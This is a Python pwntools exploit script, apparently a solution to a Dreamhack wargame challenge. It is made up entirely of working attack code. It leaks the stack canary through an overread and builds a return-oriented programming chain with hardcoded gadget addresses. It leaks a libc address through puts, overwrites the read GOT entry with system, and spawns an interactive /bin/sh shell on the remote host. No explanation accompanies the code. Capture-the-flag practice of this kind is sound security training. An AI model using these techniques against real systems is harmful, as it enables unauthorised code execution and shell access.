# File name: rop.py

from pwn import *

p = remote("host3.dreamhack.games", 17663)
libc = ELF('./libc-2.27.so')

# 1. Canary Leak
payload = b'\x90' * 57
p.sendlineafter(b'Buf: ', payload)
p.recvuntil(payload)
canary = u64(b'\x00' + p.recvn(7))

# 2. puts(read_got)
puts_plt = 0x400570
read_plt = 0x4005a0
read_got = 0x601030
pr_gadget = 0x4007f3                                              # pop rdi ; ret
ppr_gadget = 0x4007f1                                             # pop rsi ; pop r15 ; ret

payload = b'\x90' * 56 + p64(canary) + b'\x90' * 8
payload += p64(pr_gadget)
payload += p64(read_got)
payload += p64(puts_plt)

# 3. read(0, read_got, 0x10)
payload += p64(pr_gadget)
payload += p64(0)
payload += p64(ppr_gadget)
payload += p64(read_got)
payload += p64(0)
payload += p64(read_plt)

# 4. read("/bin/sh") -> system("/bin/sh")
payload += p64(pr_gadget)
payload += p64(read_got + 0x8)
payload += p64(read_plt)

p.sendafter(b'Buf: ', payload)
p.recvuntil(payload)
read = u64(p.recvn(6) + b'\x00' * 2)

libc_base = read - libc.symbols['read']
system = libc_base + libc.symbols['system']

p.send(p64(system) + b"/bin/sh\x00")
p.interactive()
